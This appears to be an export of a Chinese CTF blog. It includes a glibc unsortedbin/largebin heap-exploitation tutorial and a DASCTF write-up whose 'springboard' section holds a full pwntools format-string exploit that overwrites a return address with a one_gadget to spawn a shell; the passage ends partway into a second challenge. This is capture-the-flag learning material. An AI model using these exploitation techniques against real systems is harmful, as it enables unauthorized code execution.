<p>在不断的调试下，感觉以运动检测为基础的方案实在是不足以完成这个任务，不过追踪的潜力开发一下还是可以完成的。</p>
<h4 id="其余技术介绍"><a href="#其余技术介绍" class="headerlink" title="其余技术介绍"></a>其余技术介绍</h4><p>就像过去一样，不让自己的时间白花，记录，同时分享。</p>
<h5 id="神奇的调参"><a href="#神奇的调参" class="headerlink" title="神奇的调参"></a>神奇的调参</h5><p>和神奇的调参一样神奇的是图片预处理的操作究竟是如何选定的。</p>
<p>其实这些东西的确定是可以逻辑推理出来的，但是推的多了或者说接收到的反馈多了，自然而然就会变成一件<code>直觉</code>的事。<br>我在这里想要提及的原因是因为对这样的工作有一种感悟：有时候<code>直觉</code>其实是做多了的<code>推理</code>，而所谓<code>推理</code>也可能是由一个个<code>直觉</code>构建起来的。</p>
<h5 id="两种减运算"><a href="#两种减运算" class="headerlink" title="两种减运算"></a>两种减运算</h5><p>在实现背景差值的时候，研究了一下几种<a class="link"   href="http://www.juzicode.com/opencv-python-subtract-absdiff/" >图像的减法运算 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的区别，稍微有点意思。</p>
<p>相应的，opencv对于<a class="link"   href="http://www.juzicode.com/opencv-python-add-addweighted/" >图像的加法运算 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>也有不同的支持。</p>
<h5 id="静止帧"><a href="#静止帧" class="headerlink" title="静止帧"></a>静止帧</h5><p>一开始的静止帧检测是协会里的师傅给出的一个脚本，大概的逻辑是对比前后帧（就像没有目标检测的运动检测那样），如果连续几帧认为相似度很高的话就判断为静止，然后跳过几帧。<br>不过这里比对前后帧用的是<code>SSIM(结构相似性算法)</code>，在结果上会更加符合人眼看到的结果而不单纯的RGB数据。<br>可能是由于调参的原因会有重复输出，可能通过一些参数调整可以优化到100%正确率，但没有选择这个方案还有一个很重要的原因：</p>
<p>坐标距离判断静止的逻辑和上面这个十分相似，但多了最关键的信息就是坐标本身。如果是上面的方案的话，我们只能找到取字板选中了哪些字，以图片或者知道这是视频中的第几帧的形式，无法把这个字母输出出来，仅靠人眼的话不仅会面临繁重的工作，更有可能在类似频繁切换大小写的地方出错。</p>
<h5 id="更多追踪"><a href="#更多追踪" class="headerlink" title="更多追踪"></a>更多追踪</h5><p>在编写博客时，发现了有关追踪的更多可能性 <del>（手搓方案）</del>：</p>
<p>质心跟踪器：在每一帧上作目标检测，计算前后两帧目标质心的距离，来标定相同的ID。</p>
<p>所谓目标检测的工作可以有多种方式来完成，可以是使用深度学习的模型，也有看到使用边缘检测的，或者SSIM然后diff也可以是一种选择,总之还是主要在关注前后两帧的差异，并且要有较好的目标检测能力（把物体从背景中分离出来）</p>
<p>但质心跟踪器是对于全图的运算，十分依赖准确的目标检测，对于这道题的效果，未必比得上封装好的cv给的追踪函数。</p>
<p>(´Ａ｀。)累趴</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>CV</tag>
        <tag>Paper Reading</tag>
      </tags>
  </entry>
  <entry>
    <title>摔晓月，坐残星，温旧梦</title>
    <url>/2024/09/10/%E6%91%94%E6%99%93%E6%9C%88%EF%BC%8C%E5%9D%90%E6%AE%8B%E6%98%9F%EF%BC%8C%E6%B8%A9%E6%97%A7%E6%A2%A6/</url>
    <content><![CDATA[<p>樱桃红，芭蕉绿，容颜老。为得那般消瘦，不知黑夜早，雨声高？事易几更，人换几轮，少恨多怜，无根浮萍飘。雨落屏栏，风吹窗鞘。却道人各有命，路迢迢。</p>
<p>月花诗酒剑，醉梦天上人。潇洒浪荡不枉太白成名嬉戏耍人间一遭。今夜不思君，平日不崇君，只海上明月总伴晓星残雪，化花作酒，入诗入梦。寒风凉骨，瘦马病阙。旁人路，总少煎熬。谅我非侠客，少豪情，半羡半妒，盼回年少。</p>
<p>或不食肉糜，或不念故我，或冠冕堂皇。何时到我，倚老卖老。何时到我，何时到我。何时到我弦断人坠乐逍遥。</p>
<p>柳梢托圆盘，稍待几日，风情这般邂逅，忘黄昏，抛旭日，千愁不必诉，直奔柳梢。</p>
]]></content>
      <tags>
        <tag>喵喵</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>图解unsortedbin attack &amp; largebin attack</title>
    <url>/2024/07/23/really-ez-largebin/</url>
    <content><![CDATA[<p>(｡・ω・｡)</p>
<p>malloc 时，不仅仅是从 bin 里面找到并分配合适的内存，还有拿出后重新组织链表，这两种攻击都是在组织链表的时候被改写过的指针骗了，把一块不存在 bin 里的内存当作 free 过后的 chunk 一样组织进去。那么这块内存上就会记录指向 bin 的链表头之类的指针，也就是一个地址，仅当成数据的时候就是一个大数。</p>
<h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><h4 id="unsortedbin-结构"><a href="#unsortedbin-结构" class="headerlink" title="unsortedbin 结构"></a>unsortedbin 结构</h4><p><code>unsortedbin</code>是双向循环链表，<code>FIFO</code>，也就是后进的 chunk 会被组织进“表头”和上一个进入 unsorted bin 里的之间<br>就像这样：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240925013408.png"
                      alt="20240925013408"
                ><br>为了循环的结构看的更加清楚，我把它画成了圈的形式，chunk0 是先被 free 的堆块。</p>
<p>往 unsortedbin 里面打两个 chunk 的话也可以看到他的结构是这样的。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240925013528.png"
                      alt="20240925013528"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240925013328.png"
                      alt="20240925013328"
                ></p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>然后看源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="comment">//size check</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">  </span><br><span class="line">          <span class="comment">//此处省略进入smallbin的情况</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="comment">//unsorted bin attack</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 此处省略exact fit、进入smallbin、进入largebin</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>malloc 的时候会遍历 unsortedbin 且把他们都分配到该分配的地方去（切割分配，exact fit，smallbin，largebin）,这个过程会不断解链，把尾节点（对于循环链表这么说不太准确）放到该放的 bin 里去，然后把倒数第二个节点<code>bck</code>链接成一个新的环。 </p>
<p>而 bck &#x3D; victim-&gt;bk; 也就是只依赖 bk 来判断谁是现在的倒数第二个 chunk 。</p>
<p>如果我们伪造一个 bk 指向<code>我们希望的地址-0x10</code>作为伪造的 chunk ，那么这个 chunk 就会被当作倒数第二个节点和 bin 的头链接成循环链表。</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>具体攻击就如下图这样：<br>先塞一个 chunk0 ，然后更改 bk 指向<code>fake_chunk</code>，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240928000214.png"
                      alt="20240928000214"
                ></p>
<p>然后<code>malloc</code>一下，就会进入遍历 unsortedbbin 的环节，此时 fake_chunk 被认为是<code>bck</code>, 根据先进先出，chunk0 将从 unsortedbin 中被拿出，然后执行那两句<code>unsortedbin attack</code>的代码，可以看到有两条指针有变化，蓝色的就是我们期待的攻击结果，此时<code>fake_chunk</code>的<code>fd</code>指针位置被改成了一个大数。<br><em>（以满足exact fit时为例，其他也差不多）</em><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240928000246.png"
                      alt="20240928000246"
                ></p>
<p>不过在libc2.28及之后<br>这里的源码变成了：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></div>
<p>因为有了安全性检查，所以 unsortedbin attack 失效了，不过如果要是能泄露堆地址以及堆溢出可以改写很多的话或许还是可以绕过的。</p>
<h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p>先是 largebin 结构的介绍：</p>
<p>large bin链表总共有63个链表</p>
<p>bins 中占据 64 到 126 这个范围的位置</p>
<table>
<thead>
<tr>
<th>index</th>
<th>范围</th>
</tr>
</thead>
<tbody><tr>
<td>64</td>
<td>[0x400,0x440)</td>
</tr>
<tr>
<td>65</td>
<td>[0x440,0x480)</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>126</td>
<td>&gt;0x40000</td>
</tr>
</tbody></table>
<p>每个 bin 内部管理一段范围大小的 chunk，bin 的公差也并补固定，从0x40逐渐增大。</p>
<p>有关公差的设计，遵循下面这个表格：</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>差值</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64(0x40)</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512(0x200)</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096(0x1000)</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768(0x8000)</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144(0x40000)</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>无限制</td>
</tr>
</tbody></table>
<p>在每个 bin 管理的内部，<code>fd</code>,<code>bk</code>指针仍然指向同样大小的 chunk ,而不同大小的 chunk 通过 <code>fd_nextsize</code>,<code>bk_nextsize</code>链接，并且<code>fd_nextsize</code>,<code>bk_nextsize</code>实际上管理的是一套双向循环链表。这套链表内是每个不同大小但 size 满足同一个 largebin 的 第一个放入 largebin 的 chunk。</p>
<p>把<code>fd_nextsize</code>,<code>bk_nextsize</code>指针去掉来看，整个链表又被<code>fd</code>,<code>bk</code>链接成一套双向循环链表。这套链表管理的是所有放入 largebin 的 chunk ，以及 bin 头。</p>
<p>所以<code>fd_nextsize</code>,<code>bk_nextsize</code>也可以看成是一套跳表，比起只有<code>fd</code>,<code>bk</code>的情况，更快的找到指定大小的 chunk 。</p>
<p><code>fd</code>,<code>fd_nextsize</code>总指向更小的chunk，<code>bk</code>,<code>bk_nextsize</code>总指向更大的 chunk。</p>
<p>再是一坨 malloc 分配 largebin 源码</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = largebin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">            assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = bck;</span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line">                <span class="comment">// largebin attack 1-1</span></span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                &#123;</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">                <span class="comment">// largebin attack 1-2</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                &#125;</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// largebin attack 2</span></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<h4 id="从bin-at开始讲起"><a href="#从bin-at开始讲起" class="headerlink" title="从bin_at开始讲起"></a>从bin_at开始讲起</h4><p>其实这和利用的部分没什么关系，只是在了解后觉得这种省空间的方式很有趣。</p>
<p>数组中的 bin 依次如下</p>
<ul>
<li>unsorted bin 的索引为1。</li>
<li>索引为 2-63 的是 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</li>
<li>索引为 63-126 的是 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li>
</ul>
<p>而这一块 bin 就放在 arena 中。</p>
<p>bin_at宏定义源码</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure></div>
<p>m 代表的是分配区的地址，配合上不同类型的 bins 的索引就可以找到每个 bin 链表的头。bin_at 的作用就是通过不同 bin 的索引找到链表头。</p>
<p>通过这样的计算就能将对应的 bins() 再往前移两个单元的长度，也就是人为往前移出了<code>prev_size</code>位和<code>size</code>位。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240928014016.png"
                      alt="20240928014016"
                ><br><em>（图中bins(0),bins(1)即为 unsortedbin 的 fd,bk）</em></p>
<p>对于 bin 的链表头来说，其实<code>prev_size</code>与<code>size</code>也不是很重要，于是只是把得到的结果强行转化为malloc_chunk*类型，可以有正常的链表链接操作，而实际在内存上并不是 malloc_chunk 结构体。</p>
<h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><p>注意上文中注释<code>//largebin attack 1-2</code>的部分，</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>进入这里的 else 的情况是：</p>
<ul>
<li>largebin 非空</li>
<li>victim 不是 largebin 中最小的堆块</li>
<li>victim 的 size 和原 chunk 大小不相等。<br>这段的本意就是插入<code>fd_nextsize</code>,<code>bk_nextsize</code>链接的跳表中，但是因为没有检查 fwd 的 bk_nextsize 是否被更改，所以如果提前更改 fwd 的 bk_nextsize 那么也能塞出一条指针</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240929175706.png"
                      alt="20240929175706"
                ><br><em>(左为正常插入流程，右为伪造 bk_nextsize)</em></p>
<p>同理，当 victim 是 largebin 中最小的堆块时，则会走向<code>//largebin attack 1-1</code>，一样是在循环链表插入的时候发生</p>
<p>又同理，<code>//largebin attack 2</code>的地方也是伪造了 bk 。</p>
<h5 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h5><p>在老版本下，我们有两条路径（即选择<code>//largebin attack 1-1</code>还是<code>//largebin attack 1-2</code>），最多两个位置可以修改<br>不过修改的都是<code>bk_nextsize</code>与<code>bk</code>，造成 target_chunk 处 <code>fd_nextsize</code>与 <code>fd</code> 的链接错误。</p>
<p>最经典的 poc 就是 how2heap 的演示，选择走<code>//largebin attack 1-2</code> + <code>//largebin attack 2</code></p>
<p>这里不过多赘述具体操作，大致思想是：</p>
<ul>
<li>向 largebin 中放入一个 chunk1 ,同时在 unsortedbin 里预备一个大于 largebin 的 chunk2。</li>
<li>修改 chunk1 的 <code>bk_nextsize</code> 为 <code>target_chunk-0x20</code>, <code>bk</code>为<code>target_chunk-0x10</code></li>
<li>malloc一个堆块，触发 unsortedbin 整理机制，chunk2 链入 largebin，完成攻击。</li>
</ul>
<h4 id="libc-2-31"><a href="#libc-2-31" class="headerlink" title="libc-2.31"></a>libc-2.31</h4><p>然而同样的，在libc2.30及之后，largebin也加入了相应的校验。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//largebin attack 1-2</span></span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure></div>
<p>那么现在<br>对于第一个检查： victim 不是 largebin 中最小的堆块时不能随意更改 bk_nextsize,<code>//largebin attack 1-2</code>失效。<br>对于第二个检查：bk 的位置无法随意更改了，<code>//largebin attack 2</code>失效。<br>所幸，<code>//largebin attack 1-1</code>仍然保留</p>
<h5 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h5><p>题目：<a class="link"   href="http://zenaxu.cn/2024/06/21/heap%E5%88%9D%E6%8E%A2/" >hgame2024 week3 Elden Ring III <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>向 largebin 中放入一个 chunk1 ,同时在 unsortedbin 里预备一个小于 largebin 的 chunk2。</li>
<li>修改 chunk1 的 <code>bk_nextsize</code> 为 <code>target_chunk-0x20</code>,</li>
<li>malloc一个堆块，触发 unsortedbin 整理机制，chunk2 链入 largebin，完成攻击。</li>
</ul>
<p>(づ′▽&#96;)づ</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>迟到了非常久，久到我有点忘记了为什么要把他们写在一起，可能是因为都是双向链表，然后都是任意地址非任意写，只是改大数。暑假没写是因为真的要忘光了，然后刚回忆起来一点就又去忙干别的事。总之希望这篇能够讲清楚这两种利用，变成未来的记忆胶囊（（。</p>
<p>后后后记：没讲清楚，之后又回来补充了一些东西</p>
]]></content>
      <tags>
        <tag>学习日志</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>四道小题快送</title>
    <url>/2024/09/12/%E5%B0%8F%E9%A2%98%E5%BF%AB%E9%80%81/</url>
    <content><![CDATA[<h1 id="DASCTF-暑期挑战赛"><a href="#DASCTF-暑期挑战赛" class="headerlink" title="DASCTF 暑期挑战赛"></a>DASCTF 暑期挑战赛</h1><p>这几个题质量还行，虽然有点模板，知识点也很靠前，但是挺扎实的。</p>
<h2 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h2><p>考点在于非栈上格式化字符串，比较标准的一个题<br>通过格式化字符串更改返回地址为one gadget</p>
<p>找到一个这样的三个指针指在一起的地方，首先让他指到返回地址，也就是修改蓝框里的内容；然后再修改返回地址，也就是修改红框里的内容。</p>
<p>至于为什么要找三个指针而不是两个指针的地方是因为%n是<code>不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</code>，写入的时候是要解引用一次的。payload里控制的地址是划线的部分，对划线部分的内容（框里第一个数）解引用（框里第二个数）然后改写。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240919150809.png"
                      alt="20240919150809"
                ><br>、】<br>修改高位的地址可以通过 目标地址+2 的方式</p>
<p>泄露libc则是输出一个栈上和libc相关的地址再计算,也就是泄露图里rbp<code>+008</code>的地方就可以了</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># one gadget </span></span><br><span class="line"><span class="comment"># 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;a keyword\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%9$p-%11$p&#x27;</span>)</span><br><span class="line">r=p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">libc_start_main_240=<span class="built_in">int</span>((r[<span class="number">2</span>:<span class="number">14</span>]),<span class="number">16</span>) <span class="comment"># 接收__libc_start_main</span></span><br><span class="line">libc_base=libc_start_main_240-<span class="number">240</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ogs=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">og=libc_base+ogs[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&quot;one_gadget=&quot;</span>+<span class="built_in">hex</span>(og))</span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(r[<span class="number">17</span>:<span class="number">29</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack=&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">stack_main=stack-<span class="number">0xe0</span></span><br><span class="line">success(<span class="string">&quot;stack_main=&quot;</span>+<span class="built_in">hex</span>(stack_main))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">payload = (<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(stack_main&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%11$hn&#x27;</span>).encode()</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(og&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%37$hn&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;keyword\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>((stack_main+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span> <span class="comment"># 改写高地址</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;a keyword\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>((og&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;a keyword\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="magicbook"><a href="#magicbook" class="headerlink" title="magicbook"></a>magicbook</h2><p>largebin attack<br>原理可见这篇文章-&gt;<a class="link"   href="http://zenaxu.cn/2024/07/23/really-ez-largebin/" >图解unsortedbin attack &amp; largebin attack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>UAF,没有 show 函数，但是 delete 的时候很诡异的给了一次“遗言”的机会，配合 UAF 还挺明显的的一个largebin attack（调试的时候更明显，出题人把 fastbin 和 tcache bin 里塞了很多东西）。不过后面接的是栈溢出，倒是也把这个改大数的机制用上了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241009010338.png"
                      alt="20241009010338"
                ></p>
<p>所以libc泄露也是在栈溢出里面完成，开了沙箱所以就再构造一个 orw </p>
